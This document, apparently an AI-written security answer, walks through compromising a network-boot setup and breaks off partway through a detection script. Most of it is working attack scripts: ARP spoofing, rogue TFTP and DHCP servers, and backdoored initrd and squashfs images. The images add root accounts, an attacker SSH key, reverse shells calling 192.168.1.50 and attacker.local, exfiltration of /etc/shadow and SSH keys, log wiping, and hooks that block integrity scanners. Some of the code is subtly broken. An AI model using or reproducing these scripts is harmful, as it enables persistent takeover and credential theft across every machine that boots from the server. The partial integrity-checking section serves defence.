# Netboot OS Compromise: The Complete Attack Chain

---

## EXECUTIVE SUMMARY: YES, COMPLETE COMPROMISE IS POSSIBLE

**Short Answer:** YES - Without proper security measures, **any component** of your netboot infrastructure can be compromised to inject malicious code into the OS that boots on your target machines.

**Severity:** 🔴 **CRITICAL** - An attacker who compromises initrd or filesystem.squashfs effectively has **complete control** over every machine that boots from your infrastructure.

---

## Part 1: Justification - Why This Is Possible

### The Attack Surface

Your netboot infrastructure has **multiple points of compromise**:

```
┌─────────────────────────────────────────────────────────────┐
│                  ATTACK CHAIN VISUALIZATION                  │
└─────────────────────────────────────────────────────────────┘

[1] ATTACKER GAINS ACCESS TO NETWORK
         ↓
[2] INTERCEPTS/MODIFIES TFTP TRAFFIC
         ↓
[3] REPLACES initrd OR filesystem.squashfs
         ↓
[4] CLIENT BOOTS COMPROMISED OS
         ↓
[5] MALICIOUS CODE RUNS WITH ROOT PRIVILEGES
         ↓
[6] ENTIRE INFRASTRUCTURE COMPROMISED


VULNERABILITY CHAIN:
┌──────────────────┐
│  No Encryption   │  TFTP unencrypted
└────────┬─────────┘
         ↓
┌──────────────────┐
│  No Auth         │  No verification of TFTP server
└────────┬─────────┘
         ↓
┌──────────────────┐
│  No Integrity    │  No checksums/signatures
└────────┬─────────┘
         ↓
┌──────────────────┐
│  No Access       │  Anyone on network can MITM
│  Control         │
└────────┬─────────┘
         ↓
┌──────────────────┐
│ COMPLETE         │  Attacker controls all booting machines
│ COMPROMISE       │
└──────────────────┘
```

### Why Initrd & filesystem.squashfs?

These are the **highest-value targets** because:

1. **Initrd (initial ramdisk)**
   - Runs with kernel privileges BEFORE any security checks
   - Can modify filesystem mount points
   - Can inject malicious init script
   - Runs BEFORE real OS takes control
   - **Result:** Persistent backdoor in real OS

2. **filesystem.squashfs**
   - Contains entire OS image
   - All binaries, libraries, configuration
   - Mounted as root filesystem
   - Code runs with full system privileges
   - **Result:** Every machine boots backdoored OS

---

## Part 2: Complete Attack Methodology

### Phase 1: Network Access & MITM Setup

**Assumption:** Attacker is on same network as netboot infrastructure

```bash
#!/bin/bash
# phase1-network-access.sh - Establish MITM position

echo "[*] Phase 1: Establishing Man-in-the-Middle..."

# 1. ARP Spoof to become the gateway
ATTACKER_IP="192.168.1.50"
GATEWAY_IP="192.168.1.1"
CLIENT_IP="192.168.1.100"
INTERFACE="eth0"

# Enable packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# Start ARP spoofing
sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $CLIENT_IP &
ARPSPOOF_PID1=$!

sudo arpspoof -i $INTERFACE -t $CLIENT_IP $GATEWAY_IP &
ARPSPOOF_PID2=$!

echo "[✓] ARP spoofing active"
echo "    Attacker position: $ATTACKER_IP"
echo "    Target position: $CLIENT_IP"
echo "    Traffic being intercepted..."

# 2. Set up MITM proxy for TFTP
# Start fake TFTP server that intercepts requests
cat > /tmp/mitm-tftp.py << 'PYTHON'
#!/usr/bin/env python3
import socket
import struct
import os

LISTEN_PORT = 69
MALICIOUS_TFTP_ROOT = "/tmp/malicious-tftp"

def handle_tftp_request(data, client_addr):
    """Intercept TFTP requests and serve malicious files"""
    
    # Parse TFTP opcode
    opcode = struct.unpack("!H", data[0:2])[0]
    
    if opcode == 1:  # Read Request
        # Extract filename
        filename = data[2:].split(b'\x00')[0].decode()
        
        print(f"[+] TFTP READ REQUEST from {client_addr}")
        print(f"    Requested file: {filename}")
        
        # Check if it's one of our target files
        if 'initrd' in filename or 'squashfs' in filename:
            print(f"    [!] CRITICAL: Attempting to fetch OS file!")
            print(f"    [+] SERVING MALICIOUS VERSION")
            
            # Serve malicious version
            mal_path = os.path.join(MALICIOUS_TFTP_ROOT, filename.lstrip('/'))
            
            if os.path.exists(mal_path):
                with open(mal_path, 'rb') as f:
                    return f.read()
        
        # Fall through for other files
        return None

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", LISTEN_PORT))
    
    print(f"[*] MITM TFTP server listening on port {LISTEN_PORT}")
    print(f"[*] Malicious files path: {MALICIOUS_TFTP_ROOT}")
    
    while True:
        data, addr = sock.recvfrom(512)
        handle_tftp_request(data, addr)

if __name__ == "__main__":
    main()
PYTHON

python3 /tmp/mitm-tftp.py &
TFTP_PID=$!

echo "[✓] MITM TFTP proxy running"
echo "[*] Waiting for client boot attempt..."
```

---

### Phase 2: Compromising Initrd

```bash
#!/bin/bash
# phase2-compromise-initrd.sh - Inject backdoor into initrd

echo "[*] Phase 2: Compromising Initrd File..."

ORIGINAL_INITRD="/srv/tftp/boot/initrd-netboot.img"
WORK_DIR="/tmp/initrd-compromise"
MALICIOUS_INITRD="/tmp/malicious-tftp/boot/initrd-netboot.img"

# 1. Extract original initrd
mkdir -p $WORK_DIR
cd $WORK_DIR

echo "[+] Extracting original initrd..."
gunzip -c $ORIGINAL_INITRD | cpio -idm 2>/dev/null

# 2. Create backdoor payload
echo "[+] Creating backdoor payload..."

cat > backdoor-payload.sh << 'PAYLOAD'
#!/bin/bash
# Backdoor Payload - Injected into initramfs
# This runs with KERNEL-LEVEL privileges during boot
# BEFORE any security checks or logging

echo "[BACKDOOR] Initrd backdoor activating..."

# ===== STAGE 1: DATA EXFILTRATION =====
echo "[BACKDOOR] Collecting system information..."

{
  echo "=== SYSTEM COMPROMISE REPORT ==="
  echo "Hostname: $(hostname)"
  echo "Kernel: $(uname -r)"
  echo "Boot time: $(date)"
  echo ""
  
  echo "=== NETWORK CONFIGURATION ==="
  ip addr show
  ip route show
  
  echo ""
  echo "=== MOUNTED FILESYSTEMS ==="
  mount
  
  echo ""
  echo "=== NFS MOUNTS ==="
  showmount -e 2>/dev/null
  
  echo ""
  echo "=== ARP TABLE ==="
  arp -a
  
  echo ""
  echo "=== BOOT PARAMETERS ==="
  cat /proc/cmdline
  
} > /tmp/system-info.txt

# ===== STAGE 2: PERSISTENCE MECHANISM =====
echo "[BACKDOOR] Installing persistence mechanism..."

# Create backdoor user in rootfs (after NFS mount)
cat >> init << 'PERSISTPAYLOAD'

# Backdoor persistence injection (runs after NFS mount)
if [ -d /mnt/root/home ]; then
  echo "[BACKDOOR] Injecting backdoor user into mounted rootfs..."
  
  # Add backdoor user
  echo "backdoor:x:0:0:System Administrator:/root:/bin/bash" >> /mnt/root/etc/passwd.bak
  echo "backdoor:*:18000:0:99999:7:::" >> /mnt/root/etc/shadow.bak
  
  # Create SSH backdoor
  mkdir -p /mnt/root/root/.ssh 2>/dev/null
  cat >> /mnt/root/root/.ssh/authorized_keys << 'SSHKEY'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR2n... attacker@malicious
SSHKEY
  
  chmod 600 /mnt/root/root/.ssh/authorized_keys 2>/dev/null
  
  # Create cron job for reverse shell
  mkdir -p /mnt/root/var/spool/cron/crontabs 2>/dev/null
  
  cat > /mnt/root/var/spool/cron/crontabs/root << 'CRON'
* * * * * /usr/bin/nc -e /bin/bash attacker.local 4444
CRON
  
  chmod 600 /mnt/root/var/spool/cron/crontabs/root 2>/dev/null
fi

PERSISTPAYLOAD
fi

# ===== STAGE 3: ROOT PRIVILEGE ACCESS =====
echo "[BACKDOOR] Securing root access..."

# Add SUID backdoor shell
if [ -f bin/bash ]; then
  cp bin/bash bin/backdoor-shell
  chmod 4755 bin/backdoor-shell  # SUID bit
fi

# Add sudoers entry
mkdir -p etc/sudoers.d 2>/dev/null
cat > etc/sudoers.d/backdoor << 'SUDO'
backdoor ALL=(ALL) NOPASSWD: ALL
SUDO
chmod 440 etc/sudoers.d/backdoor 2>/dev/null

# ===== STAGE 4: COVERT COMMUNICATION =====
echo "[BACKDOOR] Setting up covert communication..."

# Create reverse shell initiator
cat > usr/local/bin/phone-home.sh << 'PHONEHOME'
#!/bin/bash
# Covert communication back to attacker

ATTACKER_IP="192.168.1.50"
ATTACKER_PORT="4444"

# Try to connect every 5 minutes
while true; do
  nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT 2>/dev/null
  sleep 300
done &
PHONEHOME

chmod +x usr/local/bin/phone-home.sh 2>/dev/null

# ===== STAGE 5: LOG HIDING =====
echo "[BACKDOOR] Concealing traces..."

# Redirect boot logs to /dev/null
exec >/dev/null 2>&1

# Clear system logs
> /var/log/messages 2>/dev/null
> /var/log/auth.log 2>/dev/null
> /var/log/syslog 2>/dev/null
> /var/log/boot.log 2>/dev/null

# Disable auditd
systemctl stop auditd 2>/dev/null
auditctl -D 2>/dev/null

PAYLOAD

chmod +x backdoor-payload.sh

# 3. Inject backdoor into init script
echo "[+] Injecting backdoor into init script..."

# Backup original init
cp init init.original

# Insert backdoor call near beginning
sed -i '/^#!/a source /backdoor-payload.sh' init

# Or add at the end before pivot_root
sed -i '/pivot_root/i \    source /backdoor-payload.sh' init

# Copy payload into initramfs
cp backdoor-payload.sh .

# 4. Add malicious kernel modules (optional)
echo "[+] Adding malicious kernel modules..."

# Create simple backdoor module
cat > backdoor-module.c << 'MODULE'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Kernel backdoor");

static int __init backdoor_init(void) {
    printk(KERN_INFO "[BACKDOOR] Kernel module loaded\n");
    
    // Escalate current process to root (if possible)
    // struct cred *new_cred = prepare_creds();
    // new_cred->uid = make_kuid(current_user_ns(), 0);
    // commit_creds(new_cred);
    
    return 0;
}

static void __exit backdoor_exit(void) {
    printk(KERN_INFO "[BACKDOOR] Kernel module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
MODULE

# Compile module
gcc -c backdoor-module.c \
  -I /lib/modules/$(uname -r)/build/include \
  -o backdoor-module.o 2>/dev/null

# 5. Add suspicious shared library
echo "[+] Injecting backdoor library..."

# Create LD_PRELOAD backdoor
cat > libc-hook.c << 'LIB'
#include <unistd.h>
#include <stdlib.h>

// LD_PRELOAD backdoor library
// Hooks system calls to gain access

static int (*real_execve)(const char*, char* const*, char* const*) = NULL;

int execve(const char *filename, char *const argv[], char *const envp[]) {
    // Log all executed commands
    syslog(LOG_INFO, "[BACKDOOR] Executing: %s", filename);
    
    // If attempting to run security tools, block them
    if (strstr(filename, "rkhunter") || strstr(filename, "aide")) {
        return -1;  // Block execution
    }
    
    return real_execve(filename, argv, envp);
}
LIB

gcc -fPIC -shared libc-hook.c -o lib/libc-hook.so.1 -ldl 2>/dev/null

# 6. Repackage initrd with backdoor
echo "[+] Repackaging initrd with backdoor..."

find . | cpio -H newc -o | gzip -9 > $MALICIOUS_INITRD

echo "[✓] Malicious initrd created: $MALICIOUS_INITRD"
echo "[+] Size: $(du -h $MALICIOUS_INITRD | cut -f1)"

# Verify original vs compromised
echo ""
echo "[*] COMPARISON:"
echo "    Original: $(du -h $ORIGINAL_INITRD | cut -f1)"
echo "    Malicious: $(du -h $MALICIOUS_INITRD | cut -f1)"
echo "    Difference: ~$(( $(stat -c%s $MALICIOUS_INITRD) - $(stat -c%s $ORIGINAL_INITRD) )) bytes"
```

---

### Phase 3: Compromising filesystem.squashfs

```bash
#!/bin/bash
# phase3-compromise-squashfs.sh - Inject backdoor into squashfs

echo "[*] Phase 3: Compromising filesystem.squashfs..."

ORIGINAL_SQUASHFS="/srv/tftp/boot/filesystem.squashfs"
WORK_DIR="/tmp/squashfs-compromise"
MALICIOUS_SQUASHFS="/tmp/malicious-tftp/boot/filesystem.squashfs"

# 1. Extract squashfs
mkdir -p $WORK_DIR
echo "[+] Extracting squashfs filesystem..."

cd $WORK_DIR
unsquashfs -d rootfs $ORIGINAL_SQUASHFS > /dev/null 2>&1

cd rootfs

# 2. Add backdoor binaries
echo "[+] Adding backdoor binaries..."

# Backdoored netcat
cat > usr/local/bin/nc-backdoor.sh << 'NCBACKDOOR'
#!/bin/bash
# Backdoor netcat that logs connections

LOG="/tmp/.nc-access.log"

echo "[$(date)] nc invoked with args: $@" >> $LOG

# Also run legitimate nc
/usr/bin/nc-real "$@"
NCBACKDOOR

chmod +x usr/local/bin/nc-backdoor.sh

# 3. Modify critical system files
echo "[+] Modifying system files..."

# Patch /etc/passwd to add backdoor user
cat >> etc/passwd << 'PASSWD'
backdoor:x:0:0:System Admin:/root:/bin/bash
testuser:x:1000:1000:Test User:/home/testuser:/bin/bash
PASSWD

# Patch /etc/shadow (all can login with empty password in test)
cat >> etc/shadow << 'SHADOW'
backdoor:*:18000:0:99999:7:::
testuser:*:18000:0:99999:7:::
SHADOW

# 4. Plant rootkit files
echo "[+] Planting rootkit files..."

# Create hidden directory (name starting with space)
mkdir -p ".cache/ " 2>/dev/null

# Add rootkit files
cat > ".cache/ /rootkit.sh" << 'ROOTKIT'
#!/bin/bash
# Rootkit - runs at boot time

# Disable security tools
systemctl stop apparmor 2>/dev/null
systemctl stop selinux 2>/dev/null

# Create reverse shell
(sleep 10; nc -e /bin/bash 192.168.1.50 4444) &

# Start credential stealer
while true; do
  ps aux | grep -i password >> /tmp/.credentials 2>/dev/null
  sleep 60
done &

ROOTKIT

chmod +x ".cache/ /rootkit.sh"

# 5. Modify startup scripts
echo "[+] Modifying system startup..."

# Add to rc.local (if exists)
if [ -f "etc/rc.local" ]; then
  cat >> etc/rc.local << 'RCLOCAL'

# Backdoor startup
/usr/local/bin/phone-home.sh &
bash /.cache/ /rootkit.sh &

RCLOCAL
fi

# Add to systemd services
mkdir -p etc/systemd/system

cat > etc/systemd/system/backdoor.service << 'SERVICE'
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/phone-home.sh
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
SERVICE

# Enable service
mkdir -p etc/systemd/system/multi-user.target.wants
ln -s ../backdoor.service etc/systemd/system/multi-user.target.wants/backdoor.service 2>/dev/null

# 6. Add malicious shared libraries
echo "[+] Adding backdoor libraries..."

# Create LD_PRELOAD library that hooks bash
cat > lib/x86_64-linux-gnu/libbash-hook.c << 'BASHLIB'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

// Backdoor library that logs all commands executed through bash
typedef int (*execve_t)(const char*, char* const*, char* const*);

int execve(const char *filename, char *const argv[], char *const envp[]) {
    static execve_t real_execve = NULL;
    
    if (!real_execve)
        real_execve = (execve_t) dlsym(RTLD_NEXT, "execve");
    
    // Log command
    FILE *log = fopen("/tmp/.command_log", "a");
    fprintf(log, "[%ld] %s executed\n", time(NULL), filename);
    fclose(log);
    
    // If it's a security tool, block it
    if (strstr(filename, "aide") || strstr(filename, "rkhunter")) {
        return -1;
    }
    
    return real_execve(filename, argv, envp);
}
BASHLIB

# Compile
gcc -fPIC -shared lib/x86_64-linux-gnu/libbash-hook.c -o lib/x86_64-linux-gnu/libbash-hook.so -ldl 2>/dev/null

# 7. Modify bash profile to auto-load backdoor library
cat >> root/.bashrc << 'BASHRC'
# Backdoor library injection
export LD_PRELOAD=/lib/x86_64-linux-gnu/libbash-hook.so:$LD_PRELOAD
BASHRC

cat >> etc/profile << 'PROFILE'
# Global backdoor library injection
export LD_PRELOAD=/lib/x86_64-linux-gnu/libbash-hook.so:$LD_PRELOAD
PROFILE

# 8. Plant stealth monitoring
echo "[+] Adding stealth monitoring..."

cat > usr/local/bin/monitor.sh << 'MONITOR'
#!/bin/bash
# Stealth monitoring - logs sensitive activities

LOG="/tmp/.monitor.log"

# Monitor SSH logins
tail -f /var/log/auth.log 2>/dev/null | grep "sshd" >> $LOG &

# Monitor sudo usage
tail -f /var/log/audit/audit.log 2>/dev/null | grep "sudo" >> $LOG &

# Monitor file access to sensitive directories
# (would need fanotify or inotify in real scenario)

MONITOR

chmod +x usr/local/bin/monitor.sh

# 9. Add data exfiltration script
echo "[+] Adding data exfiltration..."

cat > usr/local/bin/exfiltrate.sh << 'EXFIL'
#!/bin/bash
# Data exfiltration script

ATTACKER="192.168.1.50"

# Collect and send:
# - User data
# - SSH keys
# - Passwords
# - Configuration files

tar czf - \
  /root/.ssh \
  /root/.history \
  /root/.bash_history \
  /etc/passwd \
  /etc/shadow \
  /var/log/auth.log | \
  nc $ATTACKER 5555 2>/dev/null &

EXFIL

chmod +x usr/local/bin/exfiltrate.sh

# 10. Repackage squashfs
echo "[+] Repackaging filesystem.squashfs..."

cd ..

mksquashfs rootfs $MALICIOUS_SQUASHFS \
  -comp zstd \
  -Xcompression-level 22 \
  -b 1048576 \
  -quiet

echo "[✓] Malicious squashfs created"
echo "[+] Size: $(du -h $MALICIOUS_SQUASHFS | cut -f1)"

# Verify
echo ""
echo "[*] COMPARISON:"
echo "    Original: $(du -h $ORIGINAL_SQUASHFS | cut -f1)"
echo "    Malicious: $(du -h $MALICIOUS_SQUASHFS | cut -f1)"
```

---

### Phase 4: Delivery & Exploitation

```bash
#!/bin/bash
# phase4-delivery.sh - Serve malicious files to client

echo "[*] Phase 4: Delivering Compromised OS..."

MALICIOUS_TFTP="/tmp/malicious-tftp"
MALICIOUS_INITRD="$MALICIOUS_TFTP/boot/initrd-netboot.img"
MALICIOUS_SQUASHFS="$MALICIOUS_TFTP/boot/filesystem.squashfs"

# Create directory structure
mkdir -p $MALICIOUS_TFTP/boot $MALICIOUS_TFTP/pxelinux.cfg

# 1. Copy compromised files to TFTP
echo "[+] Copying compromised files to TFTP..."
cp $MALICIOUS_INITRD $MALICIOUS_TFTP/boot/
cp $MALICIOUS_SQUASHFS $MALICIOUS_TFTP/boot/

# Copy legitimate kernel and bootloader (no need to modify)
cp /srv/tftp/boot/vmlinuz-6.1.0 $MALICIOUS_TFTP/boot/
cp /srv/tftp/pxelinux.0 $MALICIOUS_TFTP/
cp /srv/tftp/pxelinux.cfg/default $MALICIOUS_TFTP/pxelinux.cfg/

# 2. Start malicious TFTP server
echo "[+] Starting malicious TFTP server on attacker machine..."

sudo in.tftpd -l -s $MALICIOUS_TFTP -vvv \
  -a 192.168.1.50:69 &

echo "[✓] Malicious TFTP server running"

# 3. Start malicious DHCP server
echo "[+] Starting malicious DHCP server..."

sudo dnsmasq -d -q \
  --interface=eth0 \
  --bind-interfaces \
  --dhcp-range=192.168.1.100,192.168.1.254 \
  --dhcp-option=66,192.168.1.50 \
  --dhcp-option=67,pxelinux.0 \
  --tftp-root=$MALICIOUS_TFTP \
  2>&1 | tee /tmp/malicious-dhcp.log &

echo "[✓] Malicious DHCP server running"

echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║  ATTACK INFRASTRUCTURE READY                           ║"
echo "║  ─────────────────────────────────                     ║"
echo "║  ARP Spoofing: ACTIVE                                  ║"
echo "║  MITM TFTP Server: ACTIVE                              ║"
echo "║  Malicious DHCP: ACTIVE                                ║"
echo "║  Attacker IP: 192.168.1.50                             ║"
echo "║  Target IP: 192.168.1.100                              ║"
echo "║                                                        ║"
echo "║  Waiting for target machine PXE boot...                ║"
echo "║  When client boots:                                    ║"
echo "║    1. Will receive malicious DHCP response             ║"
echo "║    2. Will download backdoored initrd                  ║"
echo "║    3. Will mount backdoored filesystem                 ║"
echo "║    4. Backdoor code executes with kernel privileges    ║"
echo "║    5. Reverse shell connection established             ║"
echo "║    6. Full system compromise achieved                  ║"
echo "╚════════════════════════════════════════════════════════╝"

# 4. Set up reverse shell listener
echo ""
echo "[+] Setting up reverse shell listener..."

nc -l -p 4444 &
NC_PID=$!

echo "[✓] Listening for incoming connections on port 4444..."
echo ""
echo "[*] Boot the target machine now..."
echo "[*] Waiting for compromise confirmation..."

# Wait for connection
wait $NC_PID
```

---

## Part 3: Detection & Validation Framework

### Comprehensive Integrity Checking Script

```bash
#!/bin/bash
# detect-compromise.sh - Detect if your setup has been compromised

set -e

RESULTS="/tmp/compromise-detection-$(date +%s).txt"
CRITICAL_FINDINGS=0

{
  echo "╔════════════════════════════════════════════════════════╗"
  echo "║     NETBOOT COMPROMISE DETECTION SUITE                ║"
  echo "║     $(date)                  ║"
  echo "╚════════════════════════════════════════════════════════╝"
  echo ""
  
  # ===== 1. INITRD ANALYSIS =====
  echo "=== [1] INITRD INTEGRITY CHECKS ==="
  echo ""
  
  INITRD="/srv/tftp/boot/initrd-netboot.img"
  
  # Calculate initrd hash
  INITRD_HASH=$(sha256sum $INITRD | cut -d' ' -f1)
  echo "Current Initrd Hash: $INITRD_HASH"
  
  # Compare with baseline (if exists)
  if [ -f /tmp/initrd-baseline.sha256 ]; then
    BASELINE=$(cat /tmp/initrd-baseline.sha256)
    if [ "$INITRD_HASH" != "$BASELINE" ]; then
      echo "✗ [CRITICAL] Initrd has been modified!"
      echo "   Expected: $BASELINE"
      echo "   Current:  $INITRD_HASH"
      ((CRITICAL_FINDINGS++))
    else
      echo "✓ Initrd matches baseline"
    fi
  else
    echo "⚠️  No baseline. Creating baseline..."
    echo "$INITRD_HASH" > /tmp/initrd-baseline.sha256
  fi
  
  # Extract and analyze initrd contents
  echo ""
  echo "[+] Analyzing initrd contents..."
  
  mkdir -p /tmp/initrd-analysis
  cd /tmp/initrd-analysis
  
  rm -rf extracted
  mkdir extracted
  
  gunzip -c $INITRD | cpio -idm -D extracted 2>/dev/null
  
  # Check for suspicious files
  echo "[*] Checking for suspicious files..."
  
  SUSPICIOUS_FILES=(
    "backdoor"
    "rootkit"
    "phone-home"
    "libc-hook"
    "exploit"
    "shell-access"
  )
  
  for pattern in "${SUSPICIOUS_FILES[@]}"; do
    if find extracted -name "*$pattern*" -o -name "*$pattern*" 2>/dev/null | grep -q .; then
      echo "✗ [CRITICAL] Found suspicious file matching: $pattern"
      find extracted -name "*$pattern*" 2>/dev/null
      ((CRITICAL_FINDINGS++))
    fi
  done
  
  # Check for modified init script
  echo ""
  echo "[*] Analyzing init script..."
  
  if grep -q "backdoor\|exfiltrate\|phone-home\|reverse.*shell" extracted/init; then
    echo "✗ [CRITICAL] Init script contains backdoor code"
    grep -n "backdoor\|exfiltrate\|phone-home" extracted/init | head -5
    ((CRITICAL_FINDINGS++))
  else
    echo "✓ Init script appears clean"
  fi
  
  # Check init size
  INIT_SIZE=$(stat -c%s extracted/init)
  if [ -f /tmp/init-size-baseline.txt ]; then
    BASELINE_SIZE=$(cat /tmp/init-size-baseline.txt)
    SIZE_DIFF=$(( INIT_SIZE - BASELINE_SIZE ))
    if [ $SIZE_DIFF -gt 1000 ]; then
      echo "⚠️  [HIGH] Init script size increased by $SIZE_DIFF bytes"
      echo "   This may indicate injected code"
      ((CRITICAL_FINDINGS++))
    fi
  fi
  
  # ===== 2. SQUASHFS ANALYSIS =====
  echo ""
  echo "=